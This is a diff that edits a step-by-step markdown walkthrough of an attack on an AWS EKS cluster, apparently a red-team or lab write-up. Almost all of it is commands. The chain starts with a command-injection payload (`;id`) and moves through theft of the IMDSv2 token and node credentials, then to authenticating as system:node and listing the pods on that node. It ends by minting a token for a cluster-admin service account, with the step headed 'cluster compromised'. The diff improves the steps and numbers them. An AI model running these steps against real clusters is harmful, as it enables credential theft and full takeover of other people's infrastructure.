@@ -21,7 +21,7 @@ http://<LB_HOST>/check?host=;id
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && echo $TOKEN
 ```
 
-✅ IMDSv2 session token (hop limit = 2 by default on EKS nodes)
+✅ IMDSv2 session token (hop limit = 2 is commonly configured on EKS nodes)
 
 ---
 
@@ -91,23 +91,39 @@ kubectl config set-cluster attack-cluster --certificate-authority=/tmp/eks-ca.cr
 kubectl config set-credentials attack-node --token="$EKS_TOKEN"
 kubectl config set-context attack --cluster=attack-cluster --user=attack-node
 kubectl config use-context attack
+
+# Confirm identity — Username shows system:node:<node-name>
+kubectl auth whoami
 ```
 
-✅ kubectl authenticated as `system:node` (limited by NodeRestriction)
+✅ kubectl authenticated as `system:node` — the node name is in the Username field
 
 ---
 
 ### Step 8 — Find Target Pod on Same Node
 
 ```bash
-kubectl get pods --all-namespaces -o wide
+# Extract node name from kubectl auth whoami (system:node:<node-name>)
+NODE_NAME=$(kubectl auth whoami -o jsonpath='{.status.userInfo.username}' | sed 's/system:node://')
+kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=$NODE_NAME
 ```
 
 ✅ Discovered `payment-processor` pod in `prod` namespace on our node
 
 ---
 
-### Step 9 — Get Pod UID
+### Step 9 — Enumerate Service Account
+
+```bash
+kubectl get -n prod pod/payment-processor -o jsonpath='{.spec.serviceAccountName}'
+# prod-admin-sa
+```
+
+✅ Found a potentially privileged service account bound to the pod
+
+---
+
+### Step 10 — Get Pod UID
 
 ```bash
 POD_UID=$(kubectl get pod payment-processor -n prod -o jsonpath='{.metadata.uid}')
@@ -117,7 +133,7 @@ POD_UID=$(kubectl get pod payment-processor -n prod -o jsonpath='{.metadata.uid}
 
 ---
 
-### Step 10 — Request Service Account Token (the escalation)
+### Step 11 — Request Service Account Token (the escalation)
 
 ```bash
 SA_TOKEN=$(kubectl create token prod-admin-sa -n prod \
@@ -130,15 +146,24 @@ SA_TOKEN=$(kubectl create token prod-admin-sa -n prod \
 
 ---
 
-### Step 11 — Pivot to Cluster-Admin
+### Step 12 — Pivot to Cluster-Admin & Verify Permissions
 
 ```bash
-kubectl config set-credentials attack-node --token="$SA_TOKEN"
-kubectl auth can-i '*' '*'
+# Save token to file or use directly with --token
+echo "$SA_TOKEN" > token
+
+# List all permissions cluster-wide with the new token
+kubectl auth can-i --list --token=$(cat token)
+
+# Quick verification for full cluster takeover
+kubectl auth can-i '*' '*' --token=$(cat token)
 # yes
+
+# Update your kubectl credentials to use it permanently
+kubectl config set-credentials attack-node --token="$SA_TOKEN"
 ```
 
-✅ **Full cluster-admin access — cluster compromised**
+✅ **Full cluster-admin access verified — cluster compromised**
 
 ---
 
@@ -147,9 +172,11 @@ kubectl auth can-i '*' '*'
 | Step | What | How |
 |------|------|-----|
 | 1 | RCE | Command injection in web app |
-| 2–3 | Steal node creds | IMDSv2 from pod (hop limit = 2) |
+| 2–3 | Steal node creds | IMDSv2 from pod (hop limit = 2, common config) |
 | 4 | Recon | EC2 tags reveal prod workloads |
 | 5–7 | Become system:node | IAM creds → EKS token → kubectl |
-| 8–9 | Find target | List pods on same node, get UID |
-| 10 | Impersonate SA | TokenRequest API (allowed by NodeRestriction) |
-| 11 | Cluster-admin | prod SA has ClusterRoleBinding to cluster-admin |
+| 8 | Find target pod | `--field-selector spec.nodeName=` lists pods on our node |
+| 9 | Enumerate SA | Get service account name from the pod |
+| 10 | Get pod UID | Needed for bound-object token request |
+| 11 | Impersonate SA | TokenRequest API (allowed by NodeRestriction) |
+| 12 | Cluster-admin | prod SA has ClusterRoleBinding to cluster-admin |
